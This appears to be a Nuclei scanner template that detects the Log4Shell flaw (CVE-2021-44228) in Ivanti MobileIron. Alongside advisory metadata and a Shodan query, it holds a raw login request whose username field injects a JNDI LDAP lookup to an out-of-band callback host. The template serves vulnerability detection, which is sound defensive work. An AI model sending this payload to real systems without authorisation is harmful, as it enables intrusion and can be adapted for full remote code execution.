id: mobileiron-log4j-jndi-rce
info:
  name: Ivanti MobileIron (Log4j) - Remote Code Execution
  author: meme-lord
  severity: critical
  description: Ivanti MobileIron is vulnerable to remote code execution via the Apache
    Log4j2 library through unsecured JNDI features.
  reference:
  - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
  - https://www.lunasec.io/docs/blog/log4j-zero-day/
  - https://www.zdnet.com/article/mobileiron-customers-urged-to-patch-systems-due-to-potential-log4j-exploitation/
  - https://logging.apache.org/log4j/2.x/security.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  remediation: From log4j 2.15.0, this behavior has been disabled by default. From
    version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has
    been completely removed. Note that this vulnerability is specific to log4j-core
    and does not affect log4net, log4cxx, or other Apache Logging Services projects.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-917
  metadata:
    shodan-query: http.html:"MobileIron"
    verified: 'true'
    impact: The vulnerability in Ivanti MobileIron (Log4j) has the potential to allow
      attackers to execute arbitrary code loaded from LDAP servers, posing a severe
      impact on the security of affected systems.
    recommendation: It is highly recommended that Ivanti MobileIron users update to
      the latest version of Apache Log4j2 to protect against remote code execution
      vulnerabilities.
  tags: jndi,log4j,rce,cve,cve2021,ivanti,oast,mobileiron,kev
requests:
- raw:
  - 'POST /mifs/j_spring_security_check HTTP/1.1

    Referer: {{RootURL}}/mifs/user/login.jsp

    Content-Type: application/x-www-form-urlencoded


    j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&logincontext=employee

    '
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    part: location
    words:
    - /mifs/user/login.jsp?error=1
  - type: regex
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
  extractors:
  - type: regex
    part: interactsh_request
    group: 1
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
